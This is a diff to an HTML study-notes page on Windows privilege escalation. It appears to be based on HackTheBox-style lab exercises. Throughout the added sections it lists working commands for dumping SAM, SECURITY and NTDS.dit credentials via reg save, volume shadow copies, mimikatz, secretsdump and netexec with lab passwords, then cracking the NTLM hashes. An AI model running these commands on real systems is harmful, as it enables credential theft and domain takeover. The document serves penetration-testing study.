@@ -26,7 +26,6 @@
         <div class="notion-container">
             <div class="notion-header">
                 <h1>Windows Privilege Scalation</h1>
-                <h2 style="color: #ff0000;"> !! CURRENTLY LEARNING ABOUT PRIV ESC IN WINDOWS !! <a class="notion-link" href="https://www.youtube.com/watch?v=aD_KlzVK834&list=PLBf0hzazHTGMBgq3RXdGDNJjw9iEz-lKz&index=4"> Here </a> </h2>
             </div>
 
                 <div class="notion-body">
@@ -151,13 +150,59 @@ set LPORT 9999</code></pre>
                 </div>
 
                 <div class="notion-body">
-                    <h2 id="SeBackupPrivilege">SeBackupPrivilege</h2>
+                    <h2 id="Extracting SAM">Extracting SAM</h2>
                     <ul>
-                        <p>In case you found that your user hash admincount = 1 and SeBackupPrivilege enabled (whoami /priv) you can extrac the password hashes with the following commands</p>
+                        <p>In case you found that you have enough privilege to extract config files from Windows like SAM, SYSTEM or SECURITY you could do so by doing...</p>
+                        <p>Remember that if your user has admincount = 1 and SeBackupPrivilege enabled (whoami /priv) you could perform the same process</p>
                         <pre><code class="language-powershell">reg  save hklm\sam C:\Users\emily.oscars.CICADA\Documents\sam.hive
-reg save hklm\system C:\Users\emily.oscars.CICADA\Documents\system.hive</code></pre>
-                        <p>Then extract the file with download utility and use pypkatz to view the hashses and perform a pass the hash attack</p>
-                        <pre><code class="language-powershell">pypykatz registry --sam sam.hive system.hive</code></pre>    
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save</code></pre>
+                        <p>Then extract the file with download utility (evil-winrm) and use pypkatz/hashcat/secretsdump to view the hashses and perform a pass the hash attack</p>
+                        <pre><code class="language-powershell">pypykatz registry --sam sam.hive system.hive</code></pre>
+                        <p>Remember that the password hash will have the following form (uid:rid:lmhash:nthash) the important one is the last one nthash. Situate all hashes on a file and attempt to crack them</p>    
+                        
+                        <h3>Alternative ways to do it</h3>
+                        <ul>
+                            <p>You can automate this process with netexec</p>
+                            <pre><code class="language-powershell">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</code></pre>
+                            <pre><code class="language-powershell">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</code></pre>
+                        </ul>    
+                    </ul>
+                </div>
+
+                <div class="notion-body">
+                    <h2 id="Enumerating with cmdkey (Stored credentials)">Enumerating with cmdkey (Stored credentials)</h2>
+                    <ul>
+                        <p>We can use cmdkey to enumerate the credentials stored in the current user's profile. In case we see another use we could try to login resuing credentials without issuing any cred</p>
+                        <p>An example of credentials from another used found</p>
+                         <pre><code class="language-powershell">Target: Domain:interactive=SRV01\mcharles
+Type: Domain Password
+User: SRV01\mcharles</code></pre>
+                        <p>We can reuse the credentials by doing</p>
+                        <pre><code class="language-powershell">/savecred /user:SRV01\mcharles cmd </code></pre>
+                        <p>Now we can use mimikatz to crack stored passwords from user mcharles</p>
+                        <pre><code class="language-powershell">mimikatz # privilege::debug    
+mimikatz # sekurlsa::credman  </code></pre>
+                        <p><b>It is posible that you requiere to perform a relogin from the victim side</b></p>    
+                    </ul>
+                </div>
+
+                <div class="notion-body">
+                    <h2 id="Exporting NTDS.dit">Exporting NTDS.dit</h2>
+                    <ul>
+                        <p>Create a volume shadow copy which is basically a windows mecanism to create snapshots of a disk volume while the system is in use</p>
+                        <pre><code class="language-powershell">vssadmin CREATE SHADOW /For=C:</code></pre>
+                        <p>In order to check where the NTDS.dit file is located we can use re query and look for the parameter <b>DSA Database file</b></p>
+                        <pre><code class="language-powershell">reg query "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"</code></pre>
+                        
+                        <p>Adapt the path... and Then copy the file</p>
+                        <pre><code class="language-powershell">cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\</code></pre>
+                        <p>Transfer the file and crackit using </p>
+                        <pre><code class="language-powershell">secretsdump.py -ntds ntds.dit -system system.save LOCAL</code></pre>
+                        <p>Crack the hash by using -m 1000 in hashcat (NTLM)</p>
+                        <p>Other methods more easier</p>
+                        <pre><code class="language-powershell">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</code></pre>
+                    
                     </ul>
                 </div>
 
@@ -172,15 +217,6 @@ reg save hklm\system C:\Users\emily.oscars.CICADA\Documents\system.hive</code></
                     </ul>
                 </div>
 
-                <div class="notion-body">
-                    <h2 id="Dumping SAM credentials">Dumping SAM credentials</h2>
-                    <ul>
-                        <p>In case you found that you have access to SAM and SYSTEM files you can dump credentials and crack them offline. By anycase, you only be able to do so in case you found this files in a backup you can access or if you have admin rights</p>
-                        <p>Download both files and use <b>secretsdump</b> from impacket</p>
-                        <pre><code class="language-cmd">mpacket-secretsdump -hashes 'LMHASH:NTHASH' -sam 'SAM' -system 'SYSTEM' LOCAL</code></pre>
-                        <p>Then use hashcat and do the rest...</p>   
-                    </ul>
-                </div>
         </div>
     </div>
 </body>
